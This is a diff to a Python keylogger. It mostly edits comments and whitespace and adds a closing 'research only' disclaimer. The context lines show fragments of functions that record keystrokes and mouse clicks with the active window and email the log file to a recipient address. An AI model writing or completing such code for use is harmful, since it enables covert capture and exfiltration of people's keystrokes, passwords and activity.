@@ -67,9 +67,9 @@ def send_email_with_attachment(subject, body, to_email, attachment_file_path):
     msg['From'] = from_email
     msg['To'] = to_email
     msg['Subject'] = subject
+
     # EMAIL FORMATTING
     msg.attach(MIMEText(body, 'plain'))
-    
     if attachment_file_path:
         try:
             with open(attachment_file_path, 'rb') as file:
@@ -104,6 +104,7 @@ def send_email_with_attachment(subject, body, to_email, attachment_file_path):
         print(f"AN ERROR OCCURRED: {e}")
 
 # RECORDS KEY STROKES ALONGSIDE APPLICATION/WINDOW
+# EQUIVALENTLY A PARAMETER/PROTOCOL FOR THE LATER CALLED LISTENER OPERATION
 def on_key_press(key):
     global stop_flag
     try:
@@ -134,6 +135,7 @@ def on_key_press(key):
         print(f"AN ERROR OCCURRED IN KEYBOARD HANDLER: {e}")
 
 # RECORDS MOUSE OPERATIONS ALONGSIDE APPLICATION/WINDOW
+# EQUIVALENTLY A PARAMETER/PROTOCOL FOR THE LATER CALLED LISTENER OPERATION
 def on_mouse_click(x, y, button, pressed):
     try:
         # APPLICATION/WINDOW RETRIEVER FUNCTION CALLED
@@ -175,3 +177,5 @@ send_email_with_attachment(
     to_email='RECIPIENT@EXAMPLE.com',
     attachment_file_path=log_file_name
 )
+
+# THIS PROGRAM IS ONLY MEANT FOR INDEPENDENT RESEARCH/PROJECT/ACADEMIC PURPOSES, AND ITS USE FOR MALICIOUS ACTIVITY IS STRICTLY PROHIBITED AND QUITE POSSIBLY ILLEGAL IN ALL MALICIOUS CONTEXTS
